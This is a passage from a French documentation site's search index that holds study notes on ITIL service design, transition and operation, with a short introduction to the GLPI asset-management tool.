</ul>"},{"location":"ITIL/ITIL4/#indicateurs","title":"Indicateurs","text":"<ul> <li>Comment \u00e9voluent les donn\u00e9es du service ?  </li> <li>Fait-il ce qu'on a vendu au client ?  </li> <li>Le fait-il dans le respect des SLA ?  </li> <li>Sommes-nous efficients dans la livraison quotidienne du service ?  </li> </ul>"},{"location":"ITIL/ITIL4/#les-processus-de-la-conception-des-services","title":"Les processus de la conception des services","text":""},{"location":"ITIL/ITIL4/#la-coordinations-de-la-conception","title":"La coordinations de la conception","text":"<ul> <li>Met en relation les diff\u00e9rents processus pour la cr\u00e9ation des services  </li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-du-catalogue-des-services","title":"La gestion du catalogue des services","text":"<ul> <li>Pour g\u00e9rer et garder \u00e0 jour les informations des services et leur disponibilit\u00e9  </li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-des-niveaux-de-services-sla","title":"La gestion des niveaux de services (SLA)","text":"<p>(SLA: Service Level Agreement = Accords sur les niveaux de service)  </p> <ul> <li>Dans la matrice RACI, Elle est \"accountable\"  </li> <li>Permet d'identifier les exigences, les besoins et les moyens n\u00e9cessaires \u00e0 la fourniture des services  </li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-de-la-disponibilite","title":"La gestion de la disponibilit\u00e9","text":"<ul> <li>S'assure que les niveaux de disponibilit\u00e9 d'un service sont conformes aux SLA  </li> <li>Permet aussi de supprimer les SPOF (Single Point Of Failure)  </li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-de-la-capacite","title":"La gestion de la capacit\u00e9","text":"<ul> <li>S'assure que les services actuels et futurs sont et seront d\u00e9livr\u00e9s au meilleur co\u00fbt (ressources humaines et/ou mat\u00e9rielles)  </li> <li>Elle contient trois sous-processus:  </li> <li>BCM (Business Capacity Management) - Gestion de la capacit\u00e9 orient\u00e9e m\u00e9tier - Futurs besoins  </li> <li>SCM (Service Capacity Management) - Gestion de la capacit\u00e9 orient\u00e9e service - Performances actuelles  </li> <li>CCM (Component Capacity Management) - Gestion de la capacit\u00e9 des composants - Ressources disponibles  </li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-de-la-continuite","title":"La gestion de la continuit\u00e9","text":"<ul> <li>S'assure de la poursuite de la livraison des services dans le respect des SLA dans un environnement d\u00e9grad\u00e9 (c\u00f4t\u00e9 DSI et/ou client)</li> <li>N\u00e9cessite de tester r\u00e9guli\u00e8rement et adapter les PCA (Plan de continuit\u00e9 d'Activit\u00e9)</li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-de-la-securite","title":"La gestion de la s\u00e9curit\u00e9","text":"<ul> <li>S'assure de la s\u00e9curit\u00e9 des donn\u00e9es du syst\u00e8me d'information</li> <li>Disponibilit\u00e9, confidentialit\u00e9, int\u00e9grit\u00e9, authenticit\u00e9, non-r\u00e9pudiation</li> <li>N\u00e9cessite de d\u00e9finir la politique d'utilisation du syst\u00e8me d'information</li> </ul>"},{"location":"ITIL/ITIL4/#la-gestion-des-fournisseurs","title":"La gestion des fournisseurs","text":"<ul> <li>Codifie la relation avec les fournisseurs (recrutement, contrat, niveau et qualit\u00e9 de service, litiges, ruptures de contrat)</li> </ul>"},{"location":"ITIL/ITIL4/#les-acteurs-de-la-conception-des-services-4p","title":"Les acteurs de la conception des services \"4P\"","text":""},{"location":"ITIL/ITIL4/#gestion-des-niveaux-de-services","title":"Gestion des niveaux de services","text":"<p>Le contenu d'un OLA </p> <ul> <li>Un contrat de services OLA est un contrat pour r\u00e9aliser un SLA</li> <li>Le document a la m\u00eame structure que le SLA</li> <li>L'OLA est un contrat interne, les conditions de p\u00e9nalit\u00e9s sont souvent inexistantes ou non applicables</li> </ul> <p>Le contenu d'un UC </p> <ul> <li>Un contrat de service UC est un contrat avec un prestataire externe pour r\u00e9aliser un SLA</li> <li>Le document a la m\u00eame structure que le SLA</li> <li>Des clauses juridiques sont \u00e0 ajouter pour traiter la relation entre les deux organisations</li> </ul>"},{"location":"ITIL/ITIL4/#terminologie","title":"Terminologie","text":"<p>SLR: Service Level Requirement: expression des besoins de client, niveau de satifsaction du client SLM: Service Level Manager: responsable de la gestion des niveaux de services SLA: Service Level Agreement: accord de niveaux de services conclu avec le client OLA: Operationnal Level Agreement: accord de niveaux de services conclu avec les fournisseurs internes UC: Underpinning Contract: contrat de sous-traitance Catalogue de services: document regroupant l'ensemble des services SIP: Service Improvement Program: programme d'am\u00e9lioration des services TMA: Tierce Maintenance Applicative: maintenance corrective applicative effectu\u00e9 par un tiers (d\u00e9veloppement) BPO: Business Process Outsourcing: sous-traitance fonctionnelle d'une application, d'un processus m\u00e9tier (la paie, la comptabilit\u00e9) ASP: Application Service Provision: fournir le service directement au client final via l'infrastructure de l'informatique d'un fournisseur KPO: Knowledge Process Outsourcing: appel \u00e0 un ou plusieurs consultants externes pour leurs connaissances sur les m\u00e9tiers ou la technologie  </p>"},{"location":"ITIL/ITIL4/#gestion-de-la-disponibilite","title":"Gestion de la disponibilit\u00e9","text":""},{"location":"ITIL/ITIL4/#terminologie-gestion-disponibilite","title":"Terminologie Gestion disponibilit\u00e9","text":"<p>Fiabilit\u00e9: aptitude d'un \u00e9quipement, d'un logiciel, d'un service \u00e0 fonctionner durablement avec un nombre minimum d'interruptions ou d'incidents Maintenabilit\u00e9: aptitude d'un service ou d'un \u00e9quipement \u00e0 \u00eatre remis en marche R\u00e9silience: aptitude \u00e0 continuer \u00e0 fonctionner m\u00eame si un ou plusieurs composants sont hors service Service-ability: aptitude que l'on a \u00e0 trouver des fournisseurs ou sous-traitants externes pour assurer disponibilit\u00e9, fiabilit\u00e9 et maintenabilit\u00e9 Recoverability: aptitude \u00e0 s'auto reconfigurer jusqu'au dernier niveau d'avant arr\u00eat  </p>"},{"location":"ITIL/ITIL4/#gestion-de-la-continuite-terminologie","title":"Gestion de la continuit\u00e9 - Terminologie","text":"<p>Business Continuity Plan: PCA = Plan de Continuit\u00e9 d'Activit\u00e9 : orient\u00e9 m\u00e9tier, quelles sont les activit\u00e9s op\u00e9rationnelles et leurs ressources, que vais-je maintenir ? Business Continuity Management: analyse et gestion, quels sont les risques et leurs impacts Business Impact Analysis: m\u00e9thode d'analyse de l'impact business qui permet d'\u00e9valuer les pertes potentielles Disaster Recovery Plan: PRA = Plan de Reprise d'Activit\u00e9 : plan de r\u00e9tablissement et reprise informatique  </p>"},{"location":"ITIL/ITIL4/#gestion-des-fournisseurs","title":"Gestion des Fournisseurs","text":"<p>Organisation externe \u00e0 l'entreprise qui va intervenir dans la fourniture d'un service sous contrat de sous-traitance (UC) Plusieurs relations possibles :  </p> <ul> <li>Sous-traitance: organisation externe qui s'engage pour la conception, le d\u00e9veloppement, l'exploitation et la maintenance d'un service.</li> <li>Cotraitance: organisation externe qui s'engage \u00e0 participer \u00e0 des activit\u00e9s du cycle de vie du service.</li> <li>Partenariat: engagement \u00e0 long terme pour de nouvelles opportunit\u00e9s.</li> <li>Application Service Provision (ASP): fourniture partielle ou totale d'un service \u00e0 partir de son propre SI et de son r\u00e9seau.</li> </ul>"},{"location":"ITIL/ITIL4/#gestion-de-la-securite-terminologie","title":"Gestion de la s\u00e9curit\u00e9 - Terminologie","text":"<p>La disponibilit\u00e9 des donn\u00e9es: c'est donner \u00e0 l'utilisateur qui le demande l'information dont il a besoin.  </p> <ul> <li>Exemple des disque en RAID</li> </ul> <p>La confidentialit\u00e9: c'est rendre accessible l'information \u00e0 ceux qui en ont l'autorisation et \u00e0 eux seuls.  </p> <ul> <li>Exemple les permissions de fichier et dossier afin de savoir qui peut acceder \u00e0 quoi</li> </ul> <p>L'authenticit\u00e9: c'est rendre fiables les \u00e9changes par une signature \u00e9l\u00e9ctronique.  </p> <ul> <li>Exemple des certificats electronique</li> </ul> <p>L'int\u00e9grit\u00e9: c'est s'assurer que l'information est compl\u00e8te et qu'elle n'a pas \u00e9t\u00e9 alt\u00e9r\u00e9e de mani\u00e8re frauduleuse.  </p> <ul> <li>Exemple les fichiers md5 disponible avec les images .iso a verifier avec checksum</li> </ul> <p>La non-r\u00e9putation: c'est assumer le fait d'avoir effectu\u00e9 l'action.  </p> <ul> <li>Exemple signature electronique de mail  </li> </ul>"},{"location":"ITIL/ITIL5/","title":"Livre 3 - Transition des services","text":""},{"location":"ITIL/ITIL5/#transition-des-services","title":"Transition des services","text":"<p>Objectif </p> <p>Mise en production des services (nouveaux ou am\u00e9lior\u00e9s)  </p> <p>Son r\u00f4le </p> <p>Mettre en production en respectant les livrables produits par la conception des services ainsi que les co\u00fbts     - R\u00e9alisation, construction, test, validation et d\u00e9ploiement des services Pr\u00e9voir et g\u00e9rer les ressources n\u00e9cessaires Produire la documentation Surveiller et am\u00e9liorer les services Respecter les crit\u00e8res de qualit\u00e9, de s\u00e9curit\u00e9 et les d\u00e9lais dans la d\u00e9livrance des services Prendre en compte et am\u00e9liorer la perception client  </p> <p>Dans la phase de transition, tout commence par le processus de gestion des changements avec une RFC Request For Change  </p> <p></p>"},{"location":"ITIL/ITIL5/#la-gestion-des-changements","title":"La gestion des changements","text":"<p>Ses objectifs </p> <p>S'assurer que les proc\u00e9dures et les m\u00e9thodes pour traiter les changements sont efficaces, voire efficientes S'assurer que les modifications des CI (Configuration Item) sont bien enregistr\u00e9es dans le CMS (Content Management System) R\u00e9pondre aux \u00e9volutions exprim\u00e9es par les clients en minimisant les risques d'interruption de service et en maximisant la valeur fournie  </p> <p>D\u00e9finition d'un changement </p> <p>Ajout, modification, ou retrait d'un ou plusieurs CI du syst\u00e8me d'information ou d'un ou plusieurs services fournis par ce syst\u00e8me d'information  </p> <p>Les \"7R\" de la gestion des changements  </p> <p></p> <ul> <li>Raised : qui fait la demande ?</li> <li>Reason : pour quelle raison ?</li> <li>Return : quel est le retour attendu ?</li> <li>Risks : quels sont les risques ?</li> <li>Resources : quelles seront les ressources ?</li> <li>Responsible : qui est le responsable ?</li> <li>Relationship : quelles sont les relations avec les autres changements ?</li> </ul> <p>Les origines d'un changement </p> <p>Les correctifs (\u00e9v\u00e9nement, incident, probl\u00e8me...) La l\u00e9gislation L'organisation Des directives ou des standards Des \u00e9volutions des services existants Des nouveaux services Un nouveau mod\u00e8le de sourcing Une innovation technologique  </p> <p>La demande de changement </p> <p>Tous les clients sont habilit\u00e9s \u00e0 \u00e9mettre une demande de changement, mais cela ne veut pas dire qu'elle sera accept\u00e9e. Toute demande de changement doit \u00eatre formalis\u00e9e par une RFC. RFC (Request For Change) est une formalisation d'une modification d'un ou plusieurs \u00e9l\u00e9ments de configuration (CI). Une RFC doit contenir:  </p> <ul> <li>un identifiant unique</li> <li>une date de demande</li> <li>le nom du demandeur</li> <li>une proposition de priorit\u00e9 de changement (priorit\u00e9 = impact x urgence)</li> <li>une description du changement</li> <li>les risques durant l'impl\u00e9mentation du changement</li> <li>les dates de mise en place du changement</li> <li>une estimation des ressources n\u00e9cessaires (humaine, mat\u00e9riels...)</li> </ul> <p>La gestion de la priorit\u00e9 d'une demande de changement</p> <p></p>"},{"location":"ITIL/ITIL5/#les-types-de-changement","title":"Les types de changement","text":"<p>Le changement standard </p> <ul> <li>Actions connues, document\u00e9es, d\u00e9j\u00e0 r\u00e9alis\u00e9es et test\u00e9es</li> <li>Les risques sont faibles et bien ma\u00eetris\u00e9s</li> <li>Changement pr\u00e9approuv\u00e9, maitris\u00e9 et associ\u00e9 \u00e0 des proc\u00e9dures \u00e9tablies</li> <li>R\u00e9f\u00e9renc\u00e9 dans un mini-catalogue de changements pr\u00e9autoris\u00e9s</li> </ul> <p>Le changement normal</p> <ul> <li>Il n\u00e9cessite une \u00e9valuation compl\u00e8te et une autorisation avant sa r\u00e9alisation par le CAB</li> </ul> <p>Le changement urgent</p> <ul> <li>L'urgence est exceptionnelle et devra \u00eatre valid\u00e9e et autoris\u00e9e par l'ECAB</li> <li>Court-circuitage des proc\u00e9dures (r\u00e9alisation, mise en oeuvre, documentation et tests)</li> </ul>"},{"location":"ITIL/ITIL5/#cycle-de-vie-dun-changement","title":"Cycle de vie d'un changement","text":""},{"location":"ITIL/ITIL5/#terminologie","title":"Terminologie","text":"<p>CI - Configuration Item: composant du syst\u00e8me d'information qui va contribuer \u00e0 la fourniture d'un ou plusieurs services CMS- Content Management System: logiciel de gestion des CI, de la base connaissance... CAB- Change Advisory Board: comit\u00e9 consultatif qui \u00e9value et donne un avis sur la mise en oeuvre des changements dits normaux ECAB- Emergency Change Advisory Board: comit\u00e9 qui donne l'autorisation de traiter le changement en urgence PIR- Post Implementation Review: comit\u00e9 qui analyse les r\u00e9sultats des mises en production des changements  </p>"},{"location":"ITIL/ITIL5/#la-gestion-des-actifs-de-services-et-des-configurations","title":"La gestion des actifs de services et des configurations","text":"<p>Son objectif </p> <ul> <li>Identifier, contr\u00f4ler et enregistrer les actifs de services et les \u00e9l\u00e9ments de configuration (CI - Configuration Item, les \"baselines\")</li> <li>Editer des rapports sur l'\u00e9tat des actifs de services et des \u00e9l\u00e9ments de configuration</li> <li>Auditer et v\u00e9rifier les actifs de services et les \u00e9l\u00e9ments de configuration</li> <li>Prot\u00e9ger l'int\u00e9grit\u00e9 des actifs de services et des \u00e9l\u00e9ments de configuration</li> <li>G\u00e9rer un systeme de gestion de configuration (CMS ou Configuration Management System)</li> </ul>"},{"location":"ITIL/ITIL5/#ci-element-de-configuration","title":"CI - Element de configuration","text":"<p>Un \u00e9l\u00e9ment de configuration, d\u00e9nomm\u00e9 CI, est un composant du syst\u00e8me d'information qui va contribuer \u00e0 la fourniture d'un ou plusieurs services Identifiable par un type et un ensemble d'attributs pour le d\u00e9crire Relation possible avec d'autre CI: situation, physique et fonctionnelle (ex. relation entre tour et ecran) </p> <p></p> <p>Activit\u00e9s: planification initiale </p> <p>D\u00e9finir le p\u00e9rim\u00e8tre, la strat\u00e9gie, la politique de gestion des \u00e9l\u00e9ments de configuration Connaitre les outils et les donn\u00e9es des diff\u00e9rents composants existants (v\u00e9racit\u00e9 et mise \u00e0 jour): analyse de l'existant S\u00e9lection, configuration et mod\u00e9lisation du CMS/CMDB (type de CI, attributs, relations) Chargement initial Nomination du propri\u00e9taire, des acteurs cl\u00e9s avec leurs r\u00f4les et responsabilit\u00e9s Formation des collaborateurs  </p> <p>Activit\u00e9s: planification it\u00e9rative </p> <p>Chargement des CMDB Ajustement des proc\u00e9dures, r\u00f4les et responsabilit\u00e9s  </p> <p>Les outils </p> <p>CMDB: Configuration Management System BDD de l'outils de gestion associ\u00e9 Contient des enregistrements CI  </p> <p>CMS: Configuration Management System Ensemble d'outils pour g\u00e9rer les donn\u00e9es de configuration Prend les donn\u00e9es de plusieurs CMDB pour constituer une CMDB f\u00e9d\u00e9r\u00e9e  </p> <p>DML: Definitive Media Library Lieu de stockage s\u00e9curis\u00e9 des CI logiciels R\u00e9f\u00e9rence pour tous les logiciels: contient les m\u00e9dias, documentations et cl\u00e9s de licence associ\u00e9es  </p> <p></p>"},{"location":"ITIL/ITIL5/#la-gestion-des-mises-en-production-et-des-deploiements","title":"La gestion des mises en production et des d\u00e9ploiements","text":"<p>La gestion des mises en production et des d\u00e9ploiements  </p> <ul> <li>valide, organise et planifie le d\u00e9ploiement des services (nouveaux ou mis \u00e0 jour) de fa\u00e7on \"industrielle\", en garantissant la valeur apport\u00e9e, dans le respect des SLA</li> <li>Cr\u00e9e et fournit le document \u00e0 l'exploitation des services</li> <li>S'assure que les utilisateurs ont re\u00e7u les informations et sont form\u00e9s pour utiliser les nouveaux services</li> <li>Gestion des version, convention de nommage, le R.A.C.I, les d\u00e9lais...</li> </ul> <p></p> <p>Ci-dessous les diff\u00e9rents modes de d\u00e9ploiement  </p> <p></p>"},{"location":"ITIL/ITIL5/#les-autres-processus-de-la-transition-des-services","title":"Les autres processus de la transition des services","text":"<p>La gestion de l'\u00e9valuation des changements </p> <ul> <li>Mesure l'impact des changements, en \u00e9valuant les effets et les risques</li> <li>Cr\u00e9e la revue de post-impl\u00e9mentaire (PIR)</li> <li>Ind\u00e9pendante de la gestion des changements</li> </ul> <p>La validation et les tests </p> <ul> <li>Garant du bon fonctionnement des services (nouveaux et mise \u00e0 jour) et de la gestion des erreurs d\u00e9couvertes pendant les phases d'int\u00e9gration, de pr\u00e9production et de post-mise en production</li> <li>Cr\u00e9ation de proc\u00e8s-verbaux de recette (fonctionnelle, performance, d'exploitabilit\u00e9, de service r\u00e9gulier)</li> </ul> <p>La gestion de la planification et le support \u00e0 la transition </p> <ul> <li>Organise le ou les changements (nouveaux ou mise \u00e0 jour) et g\u00e8re les ressources n\u00e9cessaires (humaines et mat\u00e9rielles)</li> </ul>"},{"location":"ITIL/ITIL5/#la-gestion-de-la-connaissance","title":"La gestion de la connaissance","text":"<p>Objectif </p> <ul> <li>Donner de l'information \u00e0 un collaborateur avec la granularit\u00e9 dont il a besoin</li> <li>Fournir une information compr\u00e9hensible et fiable</li> <li>Permettre une prise de d\u00e9cision \u00e0 tous les instants du cycle de vie</li> <li>Permettre d'optimiser et de fiabiliser les prises de d\u00e9cision (efficience)</li> <li>Permettre d'enregistrer les situations d\u00e9j\u00e0 connues</li> <li>Mettre en place et faire vivre un syst\u00e8me de gestion de la connaissance</li> <li>G\u00e9rer l'information</li> <li>S'assurer de la bonne utilisation de la base de connaissances</li> <li>SKMS - Service Knowledge Management System</li> </ul> <p>Gestion de l'information </p> <p>Identifier les exigences, les contraintes, les sp\u00e9cifications des donn\u00e9es trait\u00e9es D\u00e9finir une architecture permettant de supporter ces donn\u00e9es D\u00e9finir des outillages appropri\u00e9s pour mettre en oeuvre cette architecture Ecrire les proc\u00e9dures qui vont faire vivre ces donn\u00e9es Effectuer une analyse pr\u00e9cise de l'\u00e9tat des lieux en mati\u00e8re de gestion de la connaissance Appr\u00e9hender cette sp\u00e9cificit\u00e9 pour mieux b\u00e2tir une solution adapt\u00e9e Evaluer la performance des bases de connaissances et \u00eatre force de propositions pour l'am\u00e9lioration des bases  </p> <p>Bonne utilisation de la base </p> <p>Savoir si ce que l'on a mis en place sert \u00e0 quelque chose ou si des collaborateurs l'utilisent Comprendre qui partage la connaissance, qui capitalise la connaissance de l'entreprise L'important n'est pas une base de connaissances contenant beaucoup d'informations, mais une base de connaissances qui est utilis\u00e9e G\u00e9rer la promotion, l'information, la formation sur les bases de connaissances  </p>"},{"location":"ITIL/ITIL6/","title":"D\u00e9couverte de GLPI","text":""},{"location":"ITIL/ITIL6/#presentation","title":"Pr\u00e9sentation","text":"<p>GLPI : Gestion Libre de Parc Informatique ITSM: Information Technology Service Management confirme avec ITIL LOgiciel libre sous licence GPL 100% libre Logiciel complet pour la gestion de parc et centre de services gr\u00e2ce a la partie ticketing et SLA Plusieurs langues et plug-ins disponibles Installation possible sous Windows et Linux Pour les petits comme les grands syst\u00e8mes d'information Administrables depuis une page web, installable sur du IIS ou apache  </p>"},{"location":"ITIL/ITIL6/#fonctionnalites-gestion-de-parc","title":"Fonctionnalit\u00e9s gestion de parc","text":""},{"location":"ITIL/ITIL6/#les-interfaces","title":"Les interfaces","text":"<p>Interface simplifi\u00e9e </p> <ul> <li>Interface la plus restrictive</li> <li>Destin\u00e9e aux utilisateurs finaux</li> <li>Permet de cr\u00e9er un ticket, suivre ses tickets, acc\u00e9der aux r\u00e9servations et \u00e0 la FAQ</li> </ul> <p>Interface standard </p> <ul> <li>Interface principale de GLPI</li> <li>Tous les modules y sont disponibles en fonction des droits de chacun</li> <li>Utilis\u00e9e pour les t\u00e2ches techniciens, d'administration et de configuration</li> <li>3 vues de travail:</li> <li>personnelle</li> <li>groupe</li> <li>globale</li> </ul>"},{"location":"ITIL/ITIL6/#recherche-rapide","title":"Recherche rapide","text":"<p>Permet d'effectuer une recherche uniquement sur les champs affich\u00e9s Etendue de la recherche aux champs affich\u00e9s par d\u00e9faut de tous les \u00e9l\u00e9ments d'inventaire Utilisation possible des caract\u00e8res suivants (REGEX):  </p> <ul> <li>\"^\" pour symboliser le d\u00e9but du champ</li> <li>\"$\" pour symboliser la fin du champ</li> <li>\"NULL\" pour rechercher les champs vides</li> <li>Utilisation conjointe de \"^\" et \"$\" pour la valeur exacte d'un champ</li> </ul>"},{"location":"ITIL/ITIL6/#gestion-de-parc","title":"Gestion de parc","text":"<p>Menu Parc </p> <ul> <li>Affichage par d\u00e9faut des ordinateurs</li> <li>Possibilit\u00e9 de personnaliser les colonnes affich\u00e9es</li> <li>Menu de recherche avanc\u00e9e</li> <li>Export possible des donn\u00e9es sous diff\u00e9rents formats</li> <li>S\u00e9lection du nombre d'\u00e9l\u00e9ments \u00e0 afficher par page</li> <li>Navigation entre les pages</li> <li>Affichage possible de la corbeille</li> </ul> <p></p> <p>Recherche basique multicrit\u00e8res </p> <ul> <li>Possibilit\u00e9 de recherche combinant plusieurs crit\u00e8res</li> <li>Combinaison possible de crit\u00e8res \u00e0 l'aide d'op\u00e9rateurs logiques</li> <li>Op\u00e9rateurs logiques disponibles: ET/OU - ET PAS/OU PAS</li> <li>S'applique \u00e0 un grand nombre de param\u00e8tres de l'objet concern\u00e9</li> <li>Plusieurs crit\u00e8res de recherches selon le param\u00e8tre choisi</li> <li>Contient-Est-N'est pas-Sous-Pas sous-Avant-Apr\u00e8s,etc.</li> <li>Crit\u00e8res globaux de recherche possibles</li> </ul> <p></p> <p>Recherche avanc\u00e9e </p> <ul> <li>Possibilit\u00e9 d'utiliser des caract\u00e8res sp\u00e9ciaux pour les recherches</li> <li>NULL: s'assurer qu'un champ est vide</li> <li>Nb: utilis\u00e9 dans le cas des dates, prend un nombre de mois <li>^: tester le d\u00e9but d'un champ</li> <li>$: tester la fin d'un champ</li> <li>^$: tester une valeur exacte pour un champ</li> <li>Ann\u00e9e-Mois-Jours: tester un champ date</li> <p>Recherche sauvegard\u00e9e </p> <ul> <li>POssibilit\u00e9 de sauvegarder ses recherches</li> <li>Cr\u00e9ation d'une recherche sauvegard\u00e9e</li> <li>Un nom</li> <li>Une visibilit\u00e9/port\u00e9e</li> <li>Entit\u00e9 de rattachement avec ou sans r\u00e9cursivit\u00e9</li> <li>Comptage</li> <li>Acc\u00e8s \u00e0 ses recherches</li> </ul> <p>Modification massive </p> <ul> <li>Pour effectuer une modification sur un ensemble d'\u00e9l\u00e9ments</li> <li>Utilis\u00e9 conjointement aux recherches avanc\u00e9es</li> <li>G\u00e9n\u00e9ralement appliqu\u00e9e sur tous les \u00e9l\u00e9ments retourn\u00e9s d'une recherche</li> <li>Plusieurs actions possible</li> </ul> <p>Fiche \u00e9l\u00e9ment </p> <ul> <li>Accessible en cliquant sur un \u00e9l\u00e9ment</li> <li>Contient toutes les informations de l'\u00e9l\u00e9ment</li> <li>Menu de navigation vertical sur la gauche</li> <li>Certains onglets communs \u00e0 tous les \u00e9l\u00e9ments</li> <li>Possibilit\u00e9 d'afficher tous les onglets sur la m\u00eame page</li> <li>Navigation possible entre les fiches des \u00e9l\u00e9ments de la page courante</li> </ul> <p></p>"},{"location":"ITIL/ITIL7/","title":"Livre 4 - Exploitation des services","text":"<p>Objectifs </p> <p>D\u00e9finir le r\u00f4le de l'exploitation des services D\u00e9finir le centre de services Diff\u00e9rencier les types de support Identifier les types d'architecture d'un centre de services Identifier les processus  </p>"},{"location":"ITIL/ITIL7/#lexploitation-des-services","title":"L'exploitation des services","text":"<p>Objectif </p> <ul> <li>Coordonner les activit\u00e9s des processus garantissant l'atteinte des niveaux de service convenus</li> <li>G\u00e9rer l'exploitation au quotidien</li> </ul> <p>Ses missions </p> <ul> <li>Coordonner et r\u00e9aliser les activit\u00e9s n\u00e9cessaires \u00e0 la fourniture des services</li> <li>Exploitation - Supervision - Pilotage - Support - Maintenance</li> <li>Etre efficace puis efficient tout au long de la vie des services (co\u00fbt)</li> <li>Produire des indicateurs pour permettre \u00e0 la phase d'am\u00e9lioration continue de faire des propositions d'optimisation de la DSI</li> </ul>"},{"location":"ITIL/ITIL7/#terminologie","title":"Terminologie","text":"<p>Stabilit\u00e9 </p> <ul> <li>Le SI fonctionne normalement et est disponible : on ne change plus rien</li> <li>R\u00e9duction du nombre de changements et donc de Mises En Production au minimum (MEP)</li> </ul> <p>R\u00e9activit\u00e9 </p> <ul> <li>R\u00e9action aux sollicitations des m\u00e9tiers pour les rendre les plus performantes possibles</li> </ul> <p>Co\u00fbts par rapport \u00e0 qualit\u00e9 </p> <ul> <li>Eviter la surqualit\u00e9, r\u00e9duire les co\u00fbts en gardant le niveau demand\u00e9 : industrialisation de l'exploitation, supervision et pilotage</li> </ul> <p>R\u00e9activit\u00e9 par rapport \u00e0 proactivit\u00e9</p> <ul> <li>Agir en fonction des \u00e9v\u00e8nements ou incidents</li> <li>Essayer d'anticiper en recherchant des moyens d'optimiser le SI</li> <li>Investir pour garantir un bon fonctionnement</li> </ul>"},{"location":"ITIL/ITIL7/#les-4-fonctions-itil-v3","title":"Les 4 fonctions ITIL v3","text":""},{"location":"ITIL/ITIL7/#le-centre-de-service-au-coeur-de-lexploitation","title":"Le centre de service : au coeur de l'exploitation","text":""},{"location":"ITIL/ITIL7/#fonction-centre-de-service","title":"Fonction centre de service","text":"<p>Ses missions </p> <ul> <li>Le \"service Desk\"</li> <li>Etre point de contact unique pour les utilisateurs</li> <li>Porter toute la relation avec les utilisateurs : relation bidirectionnelle</li> <li>Servir les utilisateurs et les satisfaires</li> <li>Garantir la bonne image de la DSI aupr\u00e8s des utilisateurs</li> <li>Etre vitrine du d\u00e9partement informatique</li> <li>R\u00e9pondre aux questions et demandes des utilisateurs</li> <li>Restaurer le service dans un \u00e9tat normal, standard le plus rapidement possible dans le respect des d\u00e9lais d\u00e9finis et contractuels</li> <li>Assurer les activit\u00e9s de N1, g\u00e9rer les escalades aux groupes sup\u00e9rieurs et coordonner</li> </ul> <p>Les concepts </p> <ul> <li>Le centre d'appels (Call Center)</li> <li>Le centre d'assistance (Help Desk)</li> <li>Le centre de services (Service Center)</li> </ul> <p></p>"},{"location":"ITIL/ITIL7/#centre-dappels","title":"Centre d'appels","text":"<ul> <li>Prendre des appels</li> <li>PAsser des appels en masse</li> <li>Un standard t\u00e9l\u00e9phonique est en place</li> <li>On l'appelle / Il nous rappelle</li> <li>On s'identifie (nom, num\u00e9ro de contrat, etc.)</li> <li>On explique les raisons de l'appel</li> <li>La r\u00e9ponse du centre d'appel est souvent: \"On vous rappellera\", \"Un technicien vous rappellera\"</li> <li>Tr\u00e8s peu de valeur ajout\u00e9e, r\u00e9ponse minimale pour l'appelant</li> <li>Il est le niveau 0</li> <li>G\u00e8re tr\u00e8s peu d'actions, am\u00e8ne une forte frustration des utilisateurs</li> <li>Transfert le ticket d'appel</li> </ul>"},{"location":"ITIL/ITIL7/#centre-dassistance","title":"Centre d'assistance","text":"<ul> <li>G\u00e8re les pannes et les dysfonctionnements remont\u00e9s par les utilisateurs</li> <li>G\u00e8re et coordonne toutes les activit\u00e9s li\u00e9es au d\u00e9pannage de l'utilisateur</li> <li>Donne des informations sur l'avancement du d\u00e9pannage si l'utilisateur le demande</li> <li>Est dans des actions de type r\u00e9actif</li> <li>Attend que l'utilisateur appelle pour le renseigner</li> <li>Le centre d'assistance</li> <li>Est l\u00e0 en support des utilisateurs qui appellent</li> <li>R\u00e9pond aux sollicitations des utilisateurs</li> <li>A peu ou pas d'actions proactives vers les utilisateurs</li> </ul>"},{"location":"ITIL/ITIL7/#centre-de-service","title":"Centre de service","text":"<ul> <li>Est un surensemble du centre d'assistance en ajoutant des activit\u00e9s de proactivit\u00e9</li> <li>Intervient dans tous les processus de l'exploitation des services</li> <li>Et dans une partie des activit\u00e9s de deux processus de la transition des services</li> <li>La gestion des changements</li> <li>La gestion des d\u00e9ploiements et des mises en production</li> <li>Ses activit\u00e9s</li> <li>La prise en compte de l'appel de l'utilisateur </li> <li>Ouverture du ticket d'appel dans l'outil de gestion du centre de services</li> <li>Enregistrement des informations li\u00e9es \u00e0 l'appel de l'utilisateur</li> <li>La cat\u00e9gorisation</li> <li>La codification</li> <li>L'investigation et le diagnostic</li> <li>La r\u00e9ponse d\u00e9pendra de la demande utilisateur</li> <li>Escalade vers les groupes support de niveau 2 et de niveau 3 si n\u00e9cessaire</li> <li>La suivi de l'appel</li> <li>La r\u00e9solution / cl\u00f4ture du ticket</li> <li>La gestion des enqu\u00eates de satisfaction des utilisateurs</li> <li>La mise \u00e0 jour de la base de connaissance</li> </ul>"},{"location":"ITIL/ITIL7/#centre-de-service-local","title":"Centre de service local","text":"<p>Implant\u00e9 sur le m\u00eame site que les utilisateurs Architecture souvent repr\u00e9sent\u00e9e par un guichet, un bureau o\u00f9 les utilisateurs peuvent venir Impl\u00e9mente des environnements tr\u00e8s sp\u00e9cialis\u00e9s avec des besoins sp\u00e9cifiques  </p> <p></p> <p></p>"},{"location":"ITIL/ITIL7/#centre-de-service-centralise","title":"Centre de service centralis\u00e9","text":"<p>Implant\u00e9 sur un site unique Externalis\u00e9 Contact\u00e9 par des canaux de t\u00e9l\u00e9communication (t\u00e9l\u00e9phone, e-mail, intranet)  </p> <p></p> <p></p>"},{"location":"ITIL/ITIL7/#centre-service-virtuel","title":"Centre service virtuel","text":"<p>Mettre le demandeur en relation avec le technicien poss\u00e9dant le meilleur profil En fonction de : - L'heure - Du pays ou du site d'appel - Du profil de l'utilisateur appelant - Du m\u00e9tier du demandeur</p> <p></p> <p></p>"},{"location":"ITIL/ITIL7/#centre-service-qui-suit-le-soleil","title":"Centre service qui suit le soleil","text":"<p>Couvre une probl\u00e9matique particuli\u00e8re Fonctionne 24h/24 R\u00e9parti dans plusieurs entit\u00e9s aux quatre coins du monde dans des faisceaux horaires diff\u00e9rents A toute heure du jour ou de la nuit, l'appel est aiguill\u00e9 vers un centre ou une \u00e9quipe de jour pr\u00e9sente Choix des moyens et des outils Avoir des 